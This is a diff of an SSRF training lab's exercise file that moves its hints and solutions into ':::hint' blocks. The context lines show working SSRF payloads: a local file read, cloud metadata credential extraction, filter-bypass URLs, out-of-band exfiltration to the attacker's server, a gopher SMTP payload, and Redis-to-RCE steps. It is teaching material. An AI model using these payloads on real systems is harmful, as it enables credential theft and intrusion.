@@ -159,9 +159,7 @@ http://localhost:3000/ (Grafana)
 **Setup**: Start SSRF Lab application  
 **Goal**: Confirm SSRF vulnerability exists
 
-<details>
-<summary>💡 Hint 1: Find URL input points</summary>
-
+:::hint 💡 Hint 1: Find URL input points
 Look for features that:
 - Fetch images from URLs
 - Generate previews of links
@@ -170,11 +168,9 @@ Look for features that:
 
 Common parameters: `url=`, `src=`, `href=`, `path=`
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Test with your own server</summary>
-
+:::hint 💡 Hint 2: Test with your own server
 Set up a simple server to receive requests:
 ```bash
 # Python
@@ -187,22 +183,18 @@ nc -lvnp 8000
 ngrok http 8000
 ```
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Check different protocols</summary>
-
+:::hint 💡 Hint 3: Check different protocols
 Try various URL schemes:
 - `http://your-server.com`
 - `https://your-server.com`
 - `file:///etc/passwd`
 - `ftp://your-server.com`
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Step 1**: Find the vulnerable parameter
 ```
 http://vulnerable-app.com/fetch?url=http://your-server.com
@@ -227,7 +219,7 @@ http://vulnerable-app.com/fetch?url=http://[::1]:80
 - Error messages might leak information
 - Timing can indicate open/closed ports
 
-</details>
+:::
 
 ---
 
@@ -236,9 +228,7 @@ http://vulnerable-app.com/fetch?url=http://[::1]:80
 **Setup**: Find an application hosted on AWS/GCP/Azure  
 **Goal**: Extract cloud credentials via SSRF
 
-<details>
-<summary>💡 Hint 1: Know the metadata endpoints</summary>
-
+:::hint 💡 Hint 1: Know the metadata endpoints
 Each cloud provider has specific metadata URLs:
 - AWS: `169.254.169.254`
 - GCP: `metadata.google.internal`
@@ -246,11 +236,9 @@ Each cloud provider has specific metadata URLs:
 
 Start with the base URL and explore the structure.
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Required headers</summary>
-
+:::hint 💡 Hint 2: Required headers
 Some clouds require special headers:
 
 **Google Cloud:**
@@ -265,11 +253,9 @@ Metadata: true
 
 How can you add headers in SSRF?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Navigate the metadata tree</summary>
-
+:::hint 💡 Hint 3: Navigate the metadata tree
 Metadata is hierarchical. Start broad:
 ```
 /latest/
@@ -279,11 +265,9 @@ Metadata is hierarchical. Start broad:
 
 Look for security credentials!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **AWS Metadata Extraction:**
 ```
 # Get IAM role name
@@ -324,7 +308,7 @@ export AWS_SESSION_TOKEN=...
 aws s3 ls
 ```
 
-</details>
+:::
 
 ---
 
@@ -333,9 +317,7 @@ aws s3 ls
 **Setup**: Navigate to SSRF lesson with filters  
 **Goal**: Bypass blacklist/whitelist filters
 
-<details>
-<summary>💡 Hint 1: Alternative representations</summary>
-
+:::hint 💡 Hint 1: Alternative representations
 If `localhost` is blocked, try:
 - `127.0.0.1`
 - `127.1`
@@ -345,22 +327,18 @@ If `localhost` is blocked, try:
 
 For IP addresses, consider different formats!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: DNS tricks</summary>
-
+:::hint 💡 Hint 2: DNS tricks
 You can use:
 - Your own domain pointing to 127.0.0.1
 - xip.io service: `127.0.0.1.xip.io`
 - nip.io service: `127.0.0.1.nip.io`
 - Unicode characters in domain names
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Parser confusion</summary>
-
+:::hint 💡 Hint 3: Parser confusion
 Different parsers handle URLs differently:
 ```
 http://google.com#@evil.com/
@@ -371,11 +349,9 @@ http://google.com\@evil.com/
 
 Which part is the real host?
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **IP Address Representations:**
 ```
 # Decimal
@@ -435,7 +411,7 @@ http://bit.ly/[shortened-localhost-url]
 # Some apps check URL then fetch it separately!
 ```
 
-</details>
+:::
 
 ---
 
@@ -444,9 +420,7 @@ http://bit.ly/[shortened-localhost-url]
 **Setup**: Application that doesn't return response  
 **Goal**: Confirm SSRF and extract data without direct response
 
-<details>
-<summary>💡 Hint 1: Out-of-band detection</summary>
-
+:::hint 💡 Hint 1: Out-of-band detection
 Even without response, you can detect SSRF:
 - DNS lookups to your domain
 - HTTP requests to your server
@@ -454,11 +428,9 @@ Even without response, you can detect SSRF:
 
 Set up monitoring!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Port scanning via timing</summary>
-
+:::hint 💡 Hint 2: Port scanning via timing
 Open vs closed ports have different timings:
 - Open port: Quick response or timeout
 - Closed port: Quick "connection refused"
@@ -466,21 +438,17 @@ Open vs closed ports have different timings:
 
 Measure the response time!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Error-based extraction</summary>
-
+:::hint 💡 Hint 3: Error-based extraction
 Different errors might leak information:
 - "Connection refused" = Port closed
 - "Timeout" = Port filtered/host down
 - "Invalid response" = Port open but wrong protocol
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **DNS Exfiltration Setup:**
 ```bash
 # Use Burp Collaborator or:
@@ -528,7 +496,7 @@ gopher://localhost:25/_HELO%20localhost%0D%0AMAIL%20FROM%3A%3Cssrf@example.com%3
 Example: SSRF -> Internal webhook -> Your server
 ```
 
-</details>
+:::
 
 ---
 
@@ -536,9 +504,7 @@ Example: SSRF -> Internal webhook -> Your server
 
 **Goal**: Achieve remote code execution through SSRF
 
-<details>
-<summary>🎯 Challenge Overview</summary>
-
+:::hint 🎯 Hint 1
 Can you escalate SSRF to RCE by:
 1. Accessing internal services
 2. Exploiting those services
@@ -546,11 +512,9 @@ Can you escalate SSRF to RCE by:
 
 Think about what internal services might be vulnerable!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint: Vulnerable internal services</summary>
-
+:::hint 💡 Hint 2
 Common vulnerable services:
 - Redis (no auth) - Can write to disk
 - Memcached - Cache poisoning
@@ -558,11 +522,9 @@ Common vulnerable services:
 - Docker API - Container creation
 - Jenkins - Script console
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 3
 **Method 1: Redis RCE**
 ```
 # Write SSH key
@@ -605,7 +567,7 @@ SSRF -> Internal GitLab -> Import repo with .gitlab-ci.yml -> RCE
 SSRF -> Internal app with SQL injection -> xp_cmdshell -> RCE
 ```
 
-</details>
+:::
 
 ---
 
